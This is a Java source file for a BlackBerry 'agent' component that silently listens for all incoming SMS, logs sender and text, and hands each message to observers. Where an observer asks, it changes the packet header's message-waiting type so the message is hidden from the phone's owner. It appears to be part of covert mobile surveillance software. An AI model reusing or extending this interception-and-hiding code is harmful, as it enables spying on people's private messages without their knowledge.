package blackberry.agent.sms;

import java.io.IOException;

import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.MessageConnection;

import net.rim.device.api.io.DatagramBase;
import net.rim.device.api.io.SmsAddress;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.system.SMSPacketHeader;
import net.rim.device.api.ui.component.EditField;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.SmsObserver;

public class SmsListener46 extends SmsListener {
    private static final long GUID = 0xe78b740082783263L;
    // Statics ------------------------------------------------------------------
    private static String _openString = "sms://:0"; // See Connector implementation notes.
    // Members ------------------------------------------------------------------
    private EditField _sendText;
    private EditField _address; // A phone number for outbound SMS messages.
    private EditField _status;
    private ListeningThread _listener;
    //private SendThread _sender;
    private StringBuffer _statusMsgs = new StringBuffer(); // Cached for improved performance.
    private MessageConnection _mc;
    private boolean _stop = false;

    //#ifdef DEBUG
    static Debug debug = new Debug("SmsListener", DebugLevel.VERBOSE);
    //#endif

    private static SmsListener46 instance;
    
    private SmsListener46() {
    }

    /*
     * public void setMessageAgent(final MessageAgent messageAgent) {
     * this.messageAgent = messageAgent; }
     */

    public synchronized static SmsListener46 getInstance() {

        if (instance == null) {
            instance = (SmsListener46) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final SmsListener46 singleton = new SmsListener46();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }
    
    public boolean isRunning() {
        return _listener!=null;
    }

    protected void start() {
        _listener = new ListeningThread();
        _listener.start();
    }

    protected void stop() {
        _listener.stop();
        _listener = null;
    }

    // Inner Classes ------------------------------------------------------------
    private class ListeningThread extends Thread {
        public synchronized void stop() {
            _stop = true;

            try {
                if (_mc != null) {
                    // Close the connection so the thread will return.
                    _mc.close();
                }
            } catch (IOException e) {
                System.err.println(e.toString());
            }
        }
        
        synchronized boolean dispatch(
                byte[] message, String address, Datagram d) {

            final int size = smsObservers.size();
            boolean hide=false;
            for (int i = 0; i < size; i++) {

                final SmsObserver observer = (SmsObserver) smsObservers
                        .elementAt(i);
                //#ifdef DEBUG
                debug.trace("notify: " + observer);
                //#endif

                hide |= observer.onNewSms(message, address, true);
            }

            if(hide){

                debug.trace("hide");
                debug.trace("dbase");
                DatagramBase dbase = (DatagramBase) d;

                debug.trace("address");
                SmsAddress smsAddress = (SmsAddress) dbase
                        .getAddressBase();
                debug.trace("header");
                SMSPacketHeader header = smsAddress.getHeader();
                debug.trace("waiting: "
                        + header.getMessageWaitingType());
                header.setMessageWaitingType(3);
            }
            
            return true;
            //return saveLog(message, incoming);
        }

        public void run() {
            try {
                debug.trace("run");
                _mc = (MessageConnection) Connector.open(_openString); // Closed by the stop() method.
                DatagramConnection _dc = (DatagramConnection) _mc;
                debug.trace("mc: " + _mc);
                for (;;) {
                    if (_stop) {
                        debug.trace("stop");
                        return;
                    }

                    debug.trace("datagram");
                    Datagram d = _dc.newDatagram(_dc.getMaximumLength());
                    debug.trace("receive");
                    _dc.receive(d);
                    debug.trace("getdata");
                    byte[] bytes = d.getData();
                    String address = d.getAddress();
                    String msg = new String(bytes);
                    System.out.println("Received SMS text from " + address
                            + " : " + msg);

                   
                    dispatch(bytes, address, d);

                    //Message m = _mc.receive();
                    //receivedSmsMessage(m);
                }
            } catch (Exception e) {
                // Likely the stream was closed.
                System.err.println(e.toString());
                e.printStackTrace();
            }
        }
    }


}
